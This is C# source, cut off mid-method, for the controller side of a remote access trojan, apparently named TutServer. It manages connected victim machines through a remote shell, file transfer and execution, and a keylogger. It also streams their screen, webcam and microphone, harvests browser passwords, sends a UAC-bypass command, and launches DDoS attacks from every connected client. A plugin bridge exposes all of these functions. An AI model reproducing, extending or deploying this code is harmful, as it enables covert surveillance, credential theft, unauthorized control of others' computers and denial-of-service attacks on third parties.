using System; //For basic system functions
using System.Collections.Generic; //For List and Dictionary objects
using System.Drawing; //For form graphics
using System.Linq; //For converting arrays to list objects
using System.Text; //For encoding UTF8 (cryptogrphy)
using System.Windows.Forms; //For forms and control
using System.Net; //For network information and IP endpoint
using System.Net.Sockets; //For TCP sockets
using System.Security.Cryptography; //For encrypting traffic
using System.IO; //For file interaction
using System.Reflection; //For loading plugins runtime
using sCore; //For plugin interaction
using sCore.IO; //For binding plugin functions
using System.Threading.Tasks; //For Tasks (they are similar to threads)

#pragma warning disable IDE1006

namespace TutServer //Main Namespace
{
    public partial class Form1 : Form //Our form
    {
        #region Global Variables

        /// <summary>
        /// Limit screen update rate on a remote desktop session
        /// </summary>
        private int FPS = 80;

        /// <summary>
        /// The text format received data
        /// </summary>
        private string text = string.Empty;
        /// <summary>
        /// The number of received bytes
        /// </summary>
        private int received;

        /// <summary>
        /// File transfer Mode Copy
        /// </summary>
        private const int xfer_copy = 1;
        /// <summary>
        /// File Transfer Mode Move
        /// </summary>
        private const int xfer_move = 2;

        /// <summary>
        /// Socket used for the server
        /// </summary>
        private static Socket _serverSocket;
        /// <summary>
        /// A list of connected client sockets
        /// </summary>
        private static List<Socket> _clientSockets = new List<Socket>();
        /// <summary>
        /// Receive buffer size
        /// </summary>
        private const int _BUFFER_SIZE = 20971520;
        /// <summary>
        /// Port for the server to listen on
        /// </summary>
        private const int _PORT = 100; //port number
        /// <summary>
        /// Receive buffer
        /// </summary>
        private static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
        /// <summary>
        /// Array of controlled clients
        /// </summary>
        private int controlClient = 0;
        /// <summary>
        /// Indicates if the remote cmd is active
        /// </summary>
        private static bool _isCmdStarted = false;
        private static string hostToken = "";
        /// <summary>
        /// Distributes remote cmd data to plugins
        /// </summary>
        public static bool IsCmdStarted { get { return _isCmdStarted; } set { _isCmdStarted = value; sCore.RAT.Cmd.SetCmdOnline(hostToken, value); } }
        /// <summary>
        /// Current path for the file browser module
        /// </summary>
        private string _currentPath = "drive";
        /// <summary>
        /// Distributes the current path to plugins
        /// </summary>
        private String CurrentPath { get { return _currentPath; } set { _currentPath = value; sCore.RAT.FileSystem.SetCurrentDirectory(hostToken, value); } }
        /// <summary>
        /// File transfer from location
        /// </summary>
        private String xfer_path = "";
        /// <summary>
        /// File transfer mode
        /// </summary>
        private int xfer_mode = 0;
        /// <summary>
        /// Reference to the form
        /// </summary>
        public static Form1 me;
        /// <summary>
        /// Remote file editor content
        /// </summary>
        private String edit_content = "";
        /// <summary>
        /// Path of the file to upload
        /// </summary>
        private String fup_local_path = "";
        /// <summary>
        /// Size of the file to download
        /// </summary>
        private int fdl_size = 0;
        /// <summary>
        /// Indicates if file download is in progress
        /// </summary>
        private bool isFileDownload = false;
        /// <summary>
        /// Buffer for receiving files
        /// </summary>
        private byte[] recvFile = new byte[1];
        /// <summary>
        /// Number of bytes written to the downloaded file
        /// </summary>
        private int write_size = 0;
        /// <summary>
        /// The location of the downloaded file
        /// </summary>
        private String fdl_location = "";
        /// <summary>
        /// Indicates if the server (listener) is started
        /// </summary>
        private bool _isServerStarted = false;
        /// <summary>
        /// Distributes server start info to plugins
        /// </summary>
        private bool IsStartedServer { get { return _isServerStarted; } set { sCore.RAT.ServerSettings.SetServerState(hostToken, value); _isServerStarted = value; } }
        /// <summary>
        /// Indicates if clients need to get new IDs
        /// </summary>
        private bool reScanTarget = false;
        /// <summary>
        /// ID of the disconnected client
        /// </summary>
        private int reScanStart = -1;
        /// <summary>
        /// ID of the disconnected client
        /// </summary>
        private int killtarget = -1;
        /// <summary>
        /// Socket of the disconnected client
        /// </summary>
        private Socket killSocket;
        /// <summary>
        /// Indicates if a surveillance module if active
        /// </summary>
        private bool _multiRecv = false;
        /// <summary>
        /// Distributes if surveillance is active to plugins
        /// </summary>
        private bool MultiRecv { get { return _multiRecv; } set { _multiRecv = value; sCore.RAT.ServerSettings.SetMultiRecv(hostToken, value); } }
        /// <summary>
        /// Indicates if remote desktop watcher is active
        /// </summary>
        private bool _rdesktop = false;
        /// <summary>
        /// Distributes to plugins if remote desktop is active
        /// </summary>
        private bool RDesktop { get { return _rdesktop; } set { _rdesktop = value; sCore.RAT.RemoteDesktop.SetIsRemoteDesktop(hostToken, value); } }

        //public static double dx = 0;
        //public static double dy = 0;
        /// <summary>
        /// Indicates remote keyboard state
        /// </summary>
        public static int rkeyboard = 0;
        /// <summary>
        /// Indicates remote mouse state
        /// </summary>
        public static int rmouse = 0;
        /// <summary>
        /// Stores the previous X coordinate the mouse moved to
        /// </summary>
        public static int plx = 0;
        /// <summary>
        /// Stores the previous Y coordinate the mouse moved to
        /// </summary>
        public static int ply = 0;
        /// <summary>
        /// Indicates the screen resolution width
        /// </summary>
        public static int resx = 0;
        /// <summary>
        /// Indicates the screen resolution heigth
        /// </summary>
        public static int resy = 0;
        /// <summary>
        /// Indicates is the resolution data is set or not
        /// </summary>
        public static int resdataav = 0;
        /// <summary>
        /// Indicates if remote desktop is in full screen mode
        /// </summary>
        public static bool _isrdFull = false;
        /// <summary>
        /// Distributes remote desktop full screen status to plugins
        /// </summary>
        public static bool IsRdFull { get { return _isrdFull; } set { _isrdFull = value; sCore.RAT.RemoteDesktop.SetIsFullScreen(hostToken, value); } }
        /// <summary>
        /// Reference to the remote desktop object
        /// </summary>
        private RDesktop Rdxref;
        /// <summary>
        /// List of routed windows
        /// </summary>
        public static List<Form> routeWindow = new List<Form>();
        /// <summary>
        /// List of every tool strip item on the main form
        /// </summary>
        public static List<ToolStripItem> tsitem = new List<ToolStripItem>();
        /// <summary>
        /// List of every tool strip item's name on the main form
        /// </summary>
        public static List<String> tsrefname = new List<String>();
        /// <summary>
        /// List of control values for routed Windows to pull values from
        /// </summary>
        public static List<String> getvalue = new List<String>();
        /// <summary>
        /// List of control values for the main form to pull values from
        /// </summary>
        public static List<String> setvalue = new List<String>();
        /// <summary>
        /// Route of remote desktop module
        /// </summary>
        public static String rdRouteUpdate = "route0.none";
        /// <summary>
        /// Route of webcam watcher module
        /// </summary>
        public static String wcRouteUpdate = "route0.none";
        /// <summary>
        /// Indicates if the form protects the listView from updateing values
        /// </summary>
        public static bool protectLv = false;
        //public static int rwriteLv = 0;
        //public static bool only1 = false;
        /// <summary>
        /// Selected TabPage
        /// </summary>
        public static TabPage selected = new TabPage();
        /// <summary>
        /// List of every TabPage
        /// </summary>
        private List<TabPage> pages = new List<TabPage>();
        /// <summary>
        /// Reference to the remote button to click
        /// </summary>
        public static Button rbutton = new Button();
        /// <summary>
        /// The focused tab page before the button click procedure
        /// </summary>
        public static TabPage setPagebackup = new TabPage();
        /// <summary>
        /// The set focus back operation phases
        /// </summary>
        public static int setFocusBack = 1;
        /// <summary>
        /// The route to give back the focus to
        /// </summary>
        public static int setFocusRouteID = -1;
        /// <summary>
        /// Indicates if remote audio stream is active
        /// </summary>
        private bool _austream = false;
        /// <summary>
        /// Distributes if remote audio stream is active to plugins
        /// </summary>
        private bool AuStream { get { return _austream; } set { _austream = value; sCore.RAT.AudioListener.SetAudioStream(hostToken, value); } }
        /// <summary>
        /// Audio Stream playback object
        /// </summary>
        private AudioStream astream = new AudioStream();
        /// <summary>
        /// Indicates if webcam stream is active
        /// </summary>
        private bool _wStream = false;
        /// <summary>
        /// Distributes if remote webcam stream is active to plugins
        /// </summary>
        private bool WStream { get { return _wStream; } set { _wStream = value; sCore.RAT.RemoteCamera.SetCameraStream(hostToken, value); } }
        /// <summary>
        /// Startup folder of the client
        /// </summary>
        public String remStart = "";
        /// <summary>
        /// Remote mouse movement commands
        /// </summary>
        private List<string> rMoveCommands = new List<string>();
        /// <summary>
        /// Timer to execute mouse movement
        /// </summary>
        Timer rmoveTimer = new Timer();
        /// <summary>
        /// Linux Client Manager Module
        /// </summary>
        LinuxClientManager lcm;
        /// <summary>
        /// List of remote pipes
        /// </summary>
        List<RemotePipe> rPipeList = new List<RemotePipe>();
        /// <summary>
        /// Plugin host object
        /// </summary>
        ScriptHost sh;
#if EnableAutoLoad
        /// <summary>
        /// Indicates the progress of auto load function
        /// </summary>
        private int autoLoadProgress = 0;
#endif 

        /// <summary>
        /// Crypto exception handling flag
        /// </summary>
        private bool IsException = false; //switch
        /// <summary>
        /// Mouse movement control flag
        /// </summary>
        private bool mouseMovement = true; //switch
        /// <summary>
        /// Plugin local function bridge instance
        /// </summary>
        private ScriptHost.LocalBridgeFunctions lbf;
        /// <summary>
        /// ToolStrip item add/remove locking object
        /// </summary>
        private object TSLockObject = new object();

#endregion

#region Inner Classes

        /// <summary>
        /// Module providing connection with linux clients
        /// </summary>
        public class LinuxClientManager
        {
            /// <summary>
            /// Association between all clients and linux clients
            /// </summary>
            private List<int> clientListAssoc = new List<int>();
            /// <summary>
            /// Reference to the main form
            /// </summary>
            private Form1 ctx;

            /// <summary>
            /// Constructor
            /// </summary>
            /// <param name="context">Reference to the main form</param>
            public LinuxClientManager(Form1 context)
            {
                ctx = context; //Set the form reference
            }

            /// <summary>
            /// Add client to linux client manager
            /// </summary>
            /// <param name="clientID">The id of the client to add</param>
            public void AddAssociation(int clientID)
            {
                if (clientListAssoc.Contains(clientID)) return; //If client already added
                clientListAssoc.Add(clientID); //Add the client to the manager
                SendCommand("getinfo-" + clientID.ToString(), clientID); //Request info from linux client
            }

            /// <summary>
            /// Remove client from linux client manager
            /// </summary>
            /// <param name="clientID">The id of the client to remove</param>
            public void RemoveAssociation(int clientID)
            {
                if (!clientListAssoc.Contains(clientID)) return; //If client isn't in the list
                clientListAssoc.Remove(clientID); //Remove client from manager
            }

            /// <summary>
            /// Remove every client from the manager
            /// </summary>
            public void ResetAssociation()
            {
                clientListAssoc.Clear(); //Remove all clients
            }

            /// <summary>
            /// Check if a socket is a linux client
            /// </summary>
            /// <param name="s">The socket to check</param>
            /// <returns>True if the socket is a linux client, otherwise false</returns>
            public bool IsLinuxClient(Socket s)
            {
                int socketID = ctx.GetSocket(s); //Get the index of the socket
                return IsLinuxClient(socketID); //Check if socket is added to the manager
            }

            /// <summary>
            /// Check if a client is a linux client
            /// </summary>
            /// <param name="clientID">The ID of the client to check</param>
            /// <returns>True if it's a linux client, otherwise false</returns>
            public bool IsLinuxClient(int clientID)
            {
                if (clientListAssoc.Contains(clientID))
                {
                    return true;
                }

                return false;
            }

            /// <summary>
            /// Handle custom, linux only commands
            /// </summary>
            /// <param name="buffer">The buffer sent by the client</param>
            public void RunCustomCommands(byte[] buffer)
            {
                string command = Encoding.ASCII.GetString(buffer); //Linux sends ASCII encoded text

                if (command.StartsWith("lprocset")) //Set the process list
                {
                    command = command.Substring(8); //Remove the command header
                    string[] lines = command.Split('\n'); //Split the command into lines
                    string headerLine = lines[0]; //Header of ps -aux command
                    int pidIndex = headerLine.IndexOf("PID"); //The index of the PID column
                    pidIndex += 2; //Increase with 2, because PIDs start at "D"
                    int commandIndex = headerLine.IndexOf("COMMAND"); //The index of command (executed file path + args) here used as process name
                    headerLine = null; //Release the header line
                    List<string> vProcName = new List<string>(); //List of process names
                    List<string> vProcId = new List<string>(); //List of process IDs

                    for (int i = 1; i < lines.Length; i++) //Loop through the lines, skip one because it's the header
                    {
                        string line = lines[i]; //The current line
                        line = line.Replace("\r", String.Empty); //Remove the \r from the line
                        if (line == "" || line == String.Empty) continue; //If line is empty, then skip it
                        string strPid = ""; //The current PID
                        string strProcName = ""; //The current process name

                        for (int t = pidIndex; t >= 0; t--) //Start reading the PID backwards (from the index of "D")
                        {
                            if (line.Length <= t) continue; //If the line is shorter than the index of "D"
                            char value = line[t]; //The current character
                            if (char.IsNumber(value)) //If it's a number
                            {
                                strPid = value.ToString() + strPid; //Add it to the PID string (notice it's reversed)
                            }
                            else //It's not a number
                            {
                                break; //We are finished reading the PID
                            }
                        }

                        for (int t = commandIndex; t < line.Length; t++) //Read the command column until the end of the line
                        {
                            strProcName += line[t]; //Add it to the process name string
                        }

                        vProcName.Add(strProcName); //Add current process name to the list
                        vProcId.Add(strPid); //Add current process ID to the list
                    }

                    const string responsive = "True"; //Applicatioin is responsive (Windows Only)
                    const string noData = "N/A"; //Constant string for no data

                    for (int i = 0; i < vProcName.Count; i++) //Go thorugh all the processes
                    {
                        ctx.SetprocInfoCallback(vProcName[i], responsive, noData, noData, noData, vProcId[i]); //Add them to the listView
                    }

                    vProcName.Clear(); //Release the process name list
                    vProcId.Clear(); //Release the process IDs list
                }

                if (command.StartsWith("cmdout|")) //Treminal output received
                {
                    String toAppend = command.Substring(7); //Remove the command header
                    ctx.Append(toAppend); //Append the command to the terminal window
                }
            }

            /// <summary>
            /// Custom command sending for linux clients
            /// </summary>
            /// <param name="text">The command to send</param>
            /// <param name="target">The target client</param>
            public void SendCommand(string text, int target)
            {
                //Add exeception for cmd§ -- since this (§) character doesn't get received correctly by linuxClient

                if (text.StartsWith("cmd§")) //If we send cmd commands
                {
                    text = text.Substring(4); //Remove the command header
                    ctx.Append("user@remoteShell: " + text + Environment.NewLine); //Append the command to the shell window
                    text = "cmd|" + text; //Create a new command
                }

                byte[] buffer = Encoding.ASCII.GetBytes(text); //Create the text buffer
                Socket s = ctx.GetSocketById(target); //Get the target socket
                s.Send(buffer); //Send the command to the socket
            }
        }

        /// <summary>
        /// Module for providing plugin support
        /// </summary>
        public class ScriptHost
        {
            public class LocalBridgeFunctions : BridgeFunctions
            {
                public override MessageBoxDelegate ShowMessageBox { get; set; }
                public override VoidDelegate StartServer { get; set; }
                public override VoidDelegate StopServer { get; set; }
                public override VoidDelegate ToggleServer { get; set; }
                public override RemoteMessageDelegate ShowRemoteMessageBox { get; set; }
                public override StringDelegate PlayFrequency { get; set; }
                public override SystemSoundDelegate PlaySystemSound { get; set; }
                public override StringDelegate T2s { get; set; }
                public override SystemElementDelegate SwitchElementVisibility { get; set; }
                public override CdTrayDelegate CdTrayManipulation { get; set; }
                public override VoidDelegate ListProcesses { get; set; }
                public override StringDelegate KillProcess { get; set; }
                public override StartProcessDelegate StartProcess { get; set; }
                public override VoidDelegate StartCmd { get; set; }
                public override VoidDelegate StopCmd { get; set; }
                public override VoidDelegate ToggleCmd { get; set; }
                public override StringDelegate SendCmdCommand { get; set; }
                public override StringReturnDelegate ReadCmdOutput { get; set; }
                public override VoidDelegate ListDrives { get; set; }
                public override StringDelegate ChangeDircectory { get; set; }
                public override VoidDelegate Up1Dir { get; set; }
                public override StringDelegate CopyFile { get; set; }
                public override StringDelegate MoveFile { get; set; }
                public override StringDelegate PasteFile { get; set; }
                public override StringDelegate ExecuteFile { get; set; }
                public override String2Delegate UploadFile { get; set; }
                public override String2Delegate DownloadFile { get; set; }
                public override StringDelegate OpenFileEditor { get; set; }
                public override ChangeAttrDelegate ChangeFileAttribute { get; set; }
                public override StringDelegate DeleteFile { get; set; }
                public override String2Delegate RenameFile { get; set; }
                public override String2Delegate CreateFolder { get; set; }
                public override String2Delegate CreateFile { get; set; }
                public override VoidDelegate StartKeylogger { get; set; }
                public override VoidDelegate StopKeylogger { get; set; }
                public override VoidDelegate ReadKeylog { get; set; }
                public override VoidDelegate ClearKeylog { get; set; }
                public override VoidDelegate StartRemoteDesktop { get; set; }
                public override VoidDelegate StopRemoteDesktop { get; set; }
                public override BoolDelegate ControlRemoteMouse { get; set; }
                public override BoolDelegate ControlRemoteKeyboard { get; set; }
                public override VoidDelegate StartFullScreen { get; set; }
                public override IntDelegate StartAudio { get; set; }
                public override VoidDelegate StopAudio { get; set; }
                public override VoidDelegate ListAudio { get; set; }
                public override IntDelegate StartVideo { get; set; }
                public override VoidDelegate ListVideo { get; set; }
                public override VoidDelegate StopVideo { get; set; }
                public override DDoSTestDelegate ValidateDDoS { get; set; }
                public override VoidDelegate StopDDoS { get; set; }
                public override DDoSDelegate StartDDoS { get; set; }
                public override VoidDelegate ClearList { get; set; }
                public override VoidDelegate ListPassword { get; set; }
                public override VoidDelegate BypassUAC { get; set; }
                public override VoidDelegate StartProxy { get; set; }
                public override StringDelegate SaveFile { get; set; }
                public override StringDelegate SendRawCommand { get; set; }
                public override InputDelegate ShowInputBox { get; set; }
            }

            /// <summary>
            /// The directory of the plugins
            /// </summary>
            private readonly string dir = "";
            /// <summary>
            /// List of assemblies for plugin files
            /// </summary>
            private Dictionary<string, Assembly> scriptDlls = new Dictionary<string, Assembly>();
            /// <summary>
            /// List of the running plugins
            /// </summary>
            public List<IPluginMain> runningPlugins = new List<IPluginMain>();
            /// <summary>
            /// Plugin list
            /// </summary>
            public Dictionary<string, IPluginMain> ifaceList = new Dictionary<string, IPluginMain>();
            /// <summary>
            /// Reference to the main form
            /// </summary>
            Form1 ctx;
            /// <summary>
            /// Master key for revoking permissions (plugins cannot have this)
            /// </summary>
            private readonly string masterKey;

            /// <summary>
            /// Constructor
            /// </summary>
            /// <param name="rootDir">The directory where the plugins are located</param>
            /// <param name="parent">Reference to the main form</param>
            public ScriptHost(string rootDir, Form1 parent)
            {
                dir = rootDir; //Set the root directory
                ctx = parent; //Set the reference to the form
                masterKey = sCore.Integration.Integrate.GetMasterKey();
            }

            /// <summary>
            /// Load a single plugin dll
            /// </summary>
            /// <param name="dllName">The filename of the plugin to load</param>
            private void LoadDll(string dllName)
            {
                //if (!scriptDlls.ContainsKey(dllName)) return;
                //Assembly curAssembly = Assembly.LoadFrom(dir + "\\" + dllName); //Load the assembly of the dll
                Assembly curAssembly = scriptDlls[dllName]; //Get the assembly from the list
                IPluginMain current = null; //Declare the plugin main
                foreach (Type t in curAssembly.GetTypes()) //Loop through the types in the assembly
                {
                    if (t.GetInterface("IPluginMain") != null) //If the current type is IPluginMain
                    {
                        IPluginMain inst = Activator.CreateInstance(t) as IPluginMain; //Retrive the IPluginMain from the dll
                        current = inst; //Set the current pluginMain
                    }
                }

                if (current != null) //If plugin main found
                {
                    ifaceList.Add(dllName, current); //Add the plugin to the interface list
                }
            }

            /// <summary>
            /// Execute a single plugin dll
            /// </summary>
            /// <param name="dllName">The name of the dll to execute</param>
            public void ExecuteDll(string dllName)
            {
                if (!ifaceList.ContainsKey(dllName)) return; //Check if the plugin is loaded
                IPluginMain iface = ifaceList[dllName]; //Retrieve the plugin main
                iface.Main(); //Call the plugins main method
                if (!runningPlugins.Contains(iface)) runningPlugins.Add(iface);
            }

            /// <summary>
            /// Load every plugin in the selected directory
            /// </summary>
            public void LoadDllFiles()
            {
                scriptDlls.Clear(); //Clear the list of scriptDlls
                ifaceList.Clear(); //Clear the list of plugin interafaces
                string[] files = Directory.GetFiles(dir);
                for (int i = 0; i < files.Length; i++) //Loop through the plugin files
                {
                    string file = files[i];
                    if (!file.EndsWith(".dll")) continue; // Not a DLL File
                    Assembly currentAssembly = Assembly.LoadFrom(new FileInfo(file).FullName); //Get the assembly of the file
                    scriptDlls.Add(new FileInfo(file).Name, currentAssembly); //Add the assembly to the list
                    ctx.listBox1.Items.Add(new FileInfo(file).Name); //Add the plugin name to the UI list
                }

                foreach (string key in scriptDlls.Keys) //Loop through the files
                {
                    LoadDll(key); //Load all the plugins
                }
            }

            /// <summary>
            /// Get information about a plugin
            /// </summary>
            /// <param name="pluginName">The name of the plugin</param>
            /// <returns>An array of object filled with the plugin information</returns>
            public IPluginMain GetPluginInfo(string pluginName)
            {
                if (!ifaceList.ContainsKey(pluginName)) return null; //Plugin is not loaded
                IPluginMain iface = ifaceList[pluginName]; //Get the interface
                return iface; // Return the plugin interface
            }

            /// <summary>
            /// Check if a plugin is running
            /// </summary>
            /// <param name="pluginName">The name of the plugin to check</param>
            /// <returns>True if the plugin is running</returns>
            public bool IsPluginRunning(string pluginName)
            {
                if (runningPlugins.Contains(ifaceList[pluginName])) return true; //Plugin is running
                return false; //Plugin is not running
            }

            /// <summary>
            /// Create a function bridge between the R.A.T Server and the plugins
            /// </summary>
            public void SetupBridge()
            {
                LocalBridgeFunctions lf = new LocalBridgeFunctions
                {
                    ShowMessageBox = new MessageBoxDelegate(ctx.XMessageBox), //Local messagebox display
                    StartServer = new VoidDelegate(ctx.XStartServer), //Local server start
                    StopServer = new VoidDelegate(ctx.XStopServer), //Local server stop
                    ToggleServer = new VoidDelegate(ctx.XToggleServer), //Local server toggle (start/stop)
                    ShowRemoteMessageBox = new RemoteMessageDelegate(ctx.XRemoteMessage), //Remote messagebox display
                    PlayFrequency = new StringDelegate(ctx.XFrequency), //Remote frequency player
                    PlaySystemSound = new SystemSoundDelegate(ctx.XSystemSound), //Remote system sound player
                    T2s = new StringDelegate(ctx.XT2s), //Remote Text To Speech generator
                    SwitchElementVisibility = new SystemElementDelegate(ctx.XElements), //Remote element hide/show
                    CdTrayManipulation = new CdTrayDelegate(ctx.XCdTray), //Remote CD Tray control
                    ListProcesses = new VoidDelegate(ctx.XListProcesses), //List remote processes
                    KillProcess = new StringDelegate(ctx.XKillProcess), //Kill remote processes
                    StartProcess = new StartProcessDelegate(ctx.XStartProcess), //Start remote processes
                    StartCmd = new VoidDelegate(ctx.XStartCmd), //Start new remote cmd session
                    StopCmd = new VoidDelegate(ctx.XStopCmd), //Stop remote cmd session
                    ToggleCmd = new VoidDelegate(ctx.XToggleCmd), //Toggle remote cmd session (start/stop)
                    SendCmdCommand = new StringDelegate(ctx.XSendCmdCommand), //Send commands to remote cmd
                    ReadCmdOutput = new StringReturnDelegate(ctx.XReadCmdOutput), //Read the output of remote cmd
                    ListDrives = new VoidDelegate(ctx.XListDrives), //List the remote drives
                    ChangeDircectory = new StringDelegate(ctx.XChangeFolder), //Change the current folder
                    Up1Dir = new VoidDelegate(ctx.XUp1), //Naviagte UP1 folder
                    CopyFile = new StringDelegate(ctx.XCopyFile), //Remote file copy
                    MoveFile = new StringDelegate(ctx.XMoveFile), //Remote file move
                    PasteFile = new StringDelegate(ctx.XPasteFile), //Remote file paste
                    ExecuteFile = new StringDelegate(ctx.XExecuteFile), //Remote file execution
                    UploadFile = new String2Delegate(ctx.XUploadFile), //Remote file upload
                    DownloadFile = new String2Delegate(ctx.XDownloadFile), //Remote file download
                    OpenFileEditor = new StringDelegate(ctx.XOpenFileEditor), //Open remote file editor
                    ChangeFileAttribute = new ChangeAttrDelegate(ctx.XChangeAttribute), //Remote change file attributes
                    DeleteFile = new StringDelegate(ctx.XDeleteFile), //Remote delete file
                    RenameFile = new String2Delegate(ctx.XRenameFile), //Rename remote file
                    CreateFile = new String2Delegate(ctx.XNewFile), //Create new remote file
                    CreateFolder = new String2Delegate(ctx.XNewDirectory), //Create new remote directory
                    StartKeylogger = new VoidDelegate(ctx.XStartKeylogger), //Start remote keylogger
                    StopKeylogger = new VoidDelegate(ctx.XStopKeylogger), //Stop remote keylogger
                    ReadKeylog = new VoidDelegate(ctx.XReadKeylog), //Read the remote keylog
                    ClearKeylog = new VoidDelegate(ctx.XClearKeylog), //Clear the remote keylog
                    StartRemoteDesktop = new VoidDelegate(ctx.XStartRemoteDesktop), //Start remote desktop view
                    StopRemoteDesktop = new VoidDelegate(ctx.XStopRemoteDesktop), //Stop remote desktop view
                    StartFullScreen = new VoidDelegate(ctx.XLaunchFullScreen), //Full screen mode remote desktop view
                    ControlRemoteKeyboard = new BoolDelegate(ctx.XControlRemoteKeyboard), //Enable, Disable remote mouse control
                    ControlRemoteMouse = new BoolDelegate(ctx.XControlRemoteMouse), //Enable, Disable remote keyboard control
                    StartAudio = new IntDelegate(ctx.XStartAudio), //Start remote audio stream
                    StopAudio = new VoidDelegate(ctx.XStopAudio), //Stop remote audio stream
                    ListAudio = new VoidDelegate(ctx.XListAudio), //List remote audio listener devices
                    StartVideo = new IntDelegate(ctx.XStartVideo), //Start remote video stream
                    StopVideo = new VoidDelegate(ctx.XStopVideo), //Stop remote video stream
                    ListVideo = new VoidDelegate(ctx.XListVideo), //List remote video devices
                    StartDDoS = new DDoSDelegate(ctx.XStartDDoS), //Start a remote DDoS attack
                    StopDDoS = new VoidDelegate(ctx.XStopDDoS), //Stop the remote DDoS attack
                    ValidateDDoS = new DDoSTestDelegate(ctx.XValidateDDoS), //Validate a DDoS attack
                    ListPassword = new VoidDelegate(ctx.XListPassword), //List remote browser passwords
                    ClearList = new VoidDelegate(ctx.XClearList), //Clear the password list
                    BypassUAC = new VoidDelegate(ctx.XBypassUAC), //Try to bypass the UAC
                    StartProxy = new VoidDelegate(ctx.XLaunchProxy), //Start remote proxy server
                    SaveFile = new StringDelegate(ctx.XSaveEditorFile), //Save remote file editor
                    ShowInputBox = new InputDelegate(ctx.XInputBox) //Local show input box
                };
                sCore.UI.CommonControls.fileManagerMenu = ctx.contextMenuStrip3; //Share the file manager's context menu with the plugin
                sCore.UI.CommonControls.processMenu = ctx.contextMenuStrip2; //Share the process manager's context menu with the plugin
                sCore.UI.CommonControls.mainTabControl = ctx.tabControl1; //Share the tabControl with the plugin
                sCore.UI.ControlManager.SetFormControls(ctx.Controls); //Share every control with the plugin

                ctx.lbf = lf;
                sCore.Integration.Integrate.SetBridge(ctx.lbf);
            }

            /// <summary>
            /// Send stopping singal to a plugin
            /// </summary>
            /// <param name="iface">The plugin's interface to kill</param>
            public void StopSignalPlugin(IPluginMain iface)
            {
                iface.OnExit(); //Signal the stop to the plugin
                runningPlugins.Remove(iface); //Remove from the running plugins list
                sCore.Integration.Integrate.RevokePermissions(masterKey, iface); //Revoke the plugin's permissions
            }
        }

#endregion

#region Cross Bridge Functions

        /// <summary>
        /// Show local input box
        /// </summary>
        /// <param name="title">Title of the input box</param>
        /// <param name="message">Message of the input box</param>
        /// <returns>The result of the input box</returns>
        public Types.InputBoxValue XInputBox(string title, string message)
        {
            if (InvokeRequired) //Check if we need to invoke
            {
                return (Types.InputBoxValue) Invoke(lbf.ShowInputBox, new object[] { title, message }); //Invoke and return result
            }

            string value = ""; //Declare result
            DialogResult result = InputBox(title, message, ref value); //Show inpu box and grab dialog result
            Types.InputBoxValue inputValue = new Types.InputBoxValue() //Create new result object
            {
                dialogResult = result,
                result = value
            };

            return inputValue; //Return the result
        }

        /// <summary>
        /// Save a remote edited file
        /// </summary>
        /// <param name="content">The contents of the file to write</param>
        public void XSaveEditorFile(string content)
        {
            SaveFile(content); //Save remote file
        }

        /// <summary>
        /// Launch the remote proxy server
        /// </summary>
        public void XLaunchProxy()
        {
            if (InvokeRequired) //Check if we need to invoke
            {
                Invoke(lbf.StartProxy); //Invoke
                return; //Return
            }

            button34_Click(null, null); //Call the button click function for proxy start
        }

        /// <summary>
        /// Bypass the UAC
        /// </summary>
        public void XBypassUAC()
        {
            SendToTarget("uacbypass"); //Send UAC bypass command
        }

        /// <summary>
        /// List remote browser passwords
        /// </summary>
        public void XListPassword()
        {
            SendToTarget("getpw"); //Send command to list passwords
        }

        /// <summary>
        /// Clear the password list
        /// </summary>
        public void XClearList()
        {
            if (InvokeRequired) //Check if we need to invoke
            {
                Invoke(lbf.ClearList); //Invoke
                return; //Return
            }

            button32_Click(null, null); //Click the button for clearing password list
        }

        /// <summary>
        /// Start DDoS Attack
        /// </summary>
        /// <param name="ddos">The DDoS information object</param>
        /// <param name="attackWithAll">Attack with every connected clients</param>
        public void XStartDDoS(Types.DDoSTarget ddos, bool attackWithAll)
        {
            //Start the attack
            StartDDoS(ddos.IPAddress, ddos.PortNumber.ToString(), sCore.Utils.Convert.ToStr(ddos.DDoSProtocol), ddos.PacketSize.ToString(), ddos.ThreadCount.ToString(), ddos.Delay.ToString(), attackWithAll);
        }

        /// <summary>
        /// Stop DDoS attack
        /// </summary>
        public void XStopDDoS()
        {
            if (InvokeRequired) //Check if we need to invoke
            {
                Invoke(lbf.StopDDoS); //Invoke
                return; //Return
            }

            button30_Click(null, null); //Click the button for stopping DDoS
        }

        /// <summary>
        /// Validate DDoS target and ports
        /// </summary>
        /// <param name="ddos">DDoS information object</param>
        public void XValidateDDoS(Types.DDoSTarget ddos)
        {
            if (InvokeRequired) //Check if we need to invoke
            {
                Invoke(lbf.ValidateDDoS); //Invoke
                return; //Return
            }

            bool result = TestDDoS(ddos.IPAddress, sCore.Utils.Convert.ToStr(ddos.DDoSProtocol));  //Test the DDoS
        }

        /// <summary>
        /// Start streaming remote video
        /// </summary>
        /// <param name="deviceNumber">The device ID to stream from</param>
        public void XStartVideo(int deviceNumber)
        {
            if (InvokeRequired) //Check if we need to invoke
            {
                Invoke(lbf.StartVideo); //Invoke
                return; //Return
            }

            if (!WStream) //If video steam is not running
            {
                String id = deviceNumber.ToString(); //Convert the id to string
                String command = "wstream§" + id; //Construct the command
                MultiRecv = true; //Set multi recv since this is a surveillance module
                WStream = true; //Set the wStream to started
                button27.Text = "Stop stream"; //Update button text
                SendToTarget(command); //Send the command to the client
            }
        }

        /// <summary>
        /// Stop remote video stream
        /// </summary>
        public void XStopVideo()
        {
            if (InvokeRequired) //Check if we need to invoke
            {
                Invoke(lbf.StopVideo); //Invoke
                return; //Return
            }

            if (WStream) //Check if video stream is running
            {
                SendToTarget("wstop"); //Send the command to stop

                if (!RDesktop && !AuStream) //If no remote desktop and no audio stream is running
                {
                    Application.DoEvents(); //Do the events
                    System.Threading.Thread.Sleep(1500); //Sleep for a while (wait for client to stop sending)
                    MultiRecv = false; //Set multi recv to false, sicne no surveillance module is running
                }
                WStream = false; //Disable the wStream
                button27.Text = "Start Stream"; //Update the button text
            }
        }

        /// <summary>
        /// List video stream devices
        /// </summary>
        public void XListVideo()
        {
            SendToTarget("wlist"); //Send the listing command
        }

        /// <summary>
        /// Start remote audio stream
        /// </summary>
        /// <param name="deviceNumber">The device ID to listen to</param>
        public void XStartAudio(int deviceNumber)
        {
            if (InvokeRequired) //Check if we need to invoke
            {
                Invoke(lbf.StartAudio); //Invoke
                return; //Return
            }

            if (!AuStream) //If audio is not streaming
            {
                MultiRecv = true; //Set multiRecv, since it's a surveillance module
                AuStream = true; //Enable audio straming mode
                astream = new AudioStream(); //Create a new playback object
